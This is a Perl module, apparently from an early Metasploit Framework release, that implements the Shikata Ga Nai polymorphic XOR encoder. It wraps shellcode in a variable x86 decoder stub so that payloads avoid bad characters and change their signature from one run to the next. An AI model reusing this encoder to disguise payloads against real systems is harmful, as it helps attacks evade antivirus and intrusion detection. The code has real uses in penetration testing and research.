package Msf::Encoder::ShikataGaNai;

use strict;
use base 'Msf::Encoder';
use Pex::Encoder;
use Pex::Poly::BlockMaster;
use Pex::Poly::DeltaKing;

my $bmb = 'Pex::Poly::BlockMaster::Block';
my $bm = 'Pex::Poly:BlockMaster';

my $advanced = {
};

my $info = {
  'Name'    => 'Pex Variable Length Fnstenv/mov Double Word Xor Encoder',
  'Version' => '$Revision$',
  'Authors' => [ 'spoonm <ninjatools [at] hush.com> [Artistic License]', ],
  'Arch'    => [ 'x86' ],
  'OS'      => [ ],
  'Description'  =>  'Variable-length fnstenv/mov dword xor encoder',
  'Refs'    => [ ],
};

sub new {
  my $class = shift;
  return($class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_));
}

sub EncodePayload {
  my $self = shift;
  my $rawshell = shift;
  my $badChars = shift;

  my $xorkey = Pex::Encoder::KeyScanXorDwordFeedback($rawshell, $badChars);

  if(!$xorkey) {
    $self->PrintDebugLine(3, 'Failed to find xor key');
    return;
  }

  my $xordat = Pex::Encoder::XorDwordFeedback($xorkey, $rawshell);
  my $decoder = $self->_BuildDecoder($xorkey, length($xordat));
  my $shellcode = $decoder . $xordat;

  my $pos = Pex::Text::BadCharIndex($badChars, $shellcode);
  if($pos != -1) {
#    print Pex::Text::BufferC($shellcode);
    $self->PrintDebugLine(3, 'Bad char at pos ' . $pos);
    $self->PrintDebugLine(3, sprintf('Bad byte %i', ord(substr($shellcode, $pos, 1))));
    return;
  }

  return($shellcode);
}


sub _BuildDecoder {
  my $self = shift;
  my $bm = $self->_BuildBM(@_);

  my $delta = Pex::Poly::DeltaKing->new;
  $delta->AddData($bm->Build);
  return($delta->Build)
}

sub _BuildBM {
  my $self = shift;
  my $xor = shift;
  my $len = shift;
  my $xorkey = pack('V', $xor);
  my $l = Pex::Encoder::PackLength($len);

  # spoon's variable length dword xor add feedback whoozle codez

  my $fpuins = $bmb->new;
  for(my $b = 0xe8; $b <= 0xee; $b++) {
    $fpuins->AddBlock("[>0 fpu<]\xd9" . chr($b));
  }

  my $fnstenv = $bmb->new("\xd9\x74\x24\xf4"); # fnstenv [esp - 12]
  my $pop = $bmb->new("\x5b"); # pop ebx
  my $zero = $bmb->new(
    "\x31\xc9", # xor ecx, ecx
    "\x29\xc9", # sub ecx, ecx
  );

  my $mov;
  if($l->{'padLength'} <= 255) {
    $mov = $bmb->new("\xb1" . $l->{'lengthByte'}); # mov cl, BYTE xorlen
  }
  else {
    $mov = $bmb->new("\x66\xb9" . $l->{'lengthWord'}); # mov cx, WORD xorlen
  }

  my $movkey = $bmb->new("\xb8" . $xorkey); # mov eax, xorkey
  my $loopXor = $bmb->new;

  $loopXor->AddBlock(
    "\x31\x43[>1 chr(:end: - :fpu:)<]".     # xor [ebx+0x1b], eax
    "\x03\x43[>1 chr(:end: - :fpu:)<]".     # add eax, [ebx+0x18]
    "\x83\xeb\xfc",                         # sub ebx,-4

    "\x31\x43[>1 chr(:end: - :fpu:)<]".     # xor [ebx+0x1b], eax
    "\x83\xeb\xfc".                         # sub ebx,-4
    "\x03\x43[>1 chr(:end: - :fpu: - 4)<]", # add eax, [ebx+0x18]

    "\x83\xeb\xfc".                         # sub ebx,-4
    "\x31\x43[>1 chr(:end: - :fpu: - 4)<]". # xor [ebx+0x1b], eax
    "\x03\x43[>1 chr(:end: - :fpu: - 4)<]", # add eax, [ebx+0x18]


    "\x31\x43[>1 chr(:end: - :fpu:)<]".     # xor [ebx+0x1b], eax
    "\x03\x43[>1 chr(:end: - :fpu:)<]".     # add eax, [ebx+0x18]
    "\x83\xc3\x04".                         # add ebx, 4

    "\x31\x43[>1 chr(:end: - :fpu:)<]".     # xor [ebx+0x1b], eax
    "\x83\xc3\x04".                         # add ebx, 4
    "\x03\x43[>1 chr(:end: - :fpu: - 4)<]", # add eax, [ebx+0x18]

    "\x83\xc3\x04".                         # add ebx, 4
    "\x31\x43[>1 chr(:end: - :fpu: - 4)<]". # xor [ebx+0x1b], eax
    "\x03\x43[>1 chr(:end: - :fpu: - 4)<]", # add eax, [ebx+0x18]
  );

  my $loop = $bmb->new("\xe2\xf5[>0 end<]");# loop xor_xor
      
  $fnstenv->AddDepend($fpuins);
  $pop->AddDepend($fnstenv);
  $mov->AddDepend($zero);
  $loopXor->AddDepend($pop, $mov, $movkey);
  $loop->AddDepend($loopXor);
      
  my $block = Pex::Poly::BlockMaster->new($fpuins, $zero, $movkey);
  return($block);
}

# This is a *really* bad method of doing this, temporary
sub _OutcomeTest {
  use Digest::MD5;
  my $class = shift;
  my $times = shift;
  my $outcomes = { };
  my $bm = $class->_BuildBM(0, 0);
  for(my $i = 0; $i < $times; $i++) {
    my $delta = Pex::Poly::DeltaKing->new;
    $delta->AddData($bm->Build);
    $outcomes->{Digest::MD5::md5($delta->Build)}++;
  }
  return(scalar(keys(%{$outcomes})));
}
